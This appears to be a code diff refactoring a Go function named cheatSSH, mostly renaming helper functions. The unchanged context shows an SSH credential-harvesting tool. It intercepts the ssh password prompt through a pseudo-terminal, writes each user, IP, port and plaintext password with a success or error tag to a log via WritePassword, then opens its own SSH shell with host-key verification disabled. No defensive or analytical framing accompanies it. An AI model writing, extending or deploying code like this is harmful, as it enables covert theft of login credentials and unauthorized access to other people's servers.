@@ -21,10 +21,7 @@ var SSHIfFirst = regexp.MustCompile(`^(The authenticity)`)
 
 func cheatSSH() {
 	var pty, err = term.OpenPTY()
-	if err != nil {
-		execScript(cmd)
-		return
-	}
+	ExecIfErr(err)
 	var user, password, ip, port string
 	var writeMsg = make(chan struct{})
 	var readLock = make(chan struct{})
@@ -41,7 +38,7 @@ func cheatSSH() {
 	go func() {
 		for {
 			<-writeMsg
-			password = getPassword()
+			password = GetPassword()
 			pty.Master.WriteString(password + "\r\n")
 		}
 
@@ -93,12 +90,12 @@ func cheatSSH() {
 					}
 					prefix := user + " " + ip + " " + port
 					if SSHSuccess.MatchString(line) {
-						writePassword(prefix + " " + password + " success")
+						WritePassword(prefix + " " + password + " success")
 						c.Process.Kill()
 						readLock <- struct{}{}
 						return
 					} else {
-						writePassword(prefix + " " + password + " error")
+						WritePassword(prefix + " " + password + " error")
 						password = ""
 					}
 				}
@@ -132,7 +129,7 @@ func cheatSSH() {
 		startSSHShell(user, password, ip, port)
 	}
 	if !AskPass && password == "" {
-		execScript(cmd)
+		ExecScript(cmd)
 	}
 }
 func getSSHInfo() (string, string, string) {
@@ -163,18 +160,18 @@ func startSSHShell(user string, password string, ip string, port string) {
 		Auth:            []ssh.AuthMethod{ssh.Password(password)},
 		HostKeyCallback: ssh.InsecureIgnoreHostKey(),
 	})
-	checkErr(err)
+	CheckErr(err)
 	session, err := client.NewSession()
 	defer session.Close()
 	fd := int(os.Stdin.Fd())
 	oldState, err := terminal.MakeRaw(fd)
-	checkErr(err)
+	CheckErr(err)
 	defer terminal.Restore(fd, oldState)
 	// 拿到当前终端文件描述符
 	termWidth, termHeight, err := terminal.GetSize(fd)
 	// request pty
 	err = session.RequestPty("xterm-256color", termHeight, termWidth, ssh.TerminalModes{})
-	checkErr(err)
+	CheckErr(err)
 	// 对接 std
 	session.Stdout = os.Stdout
 	session.Stderr = os.Stderr
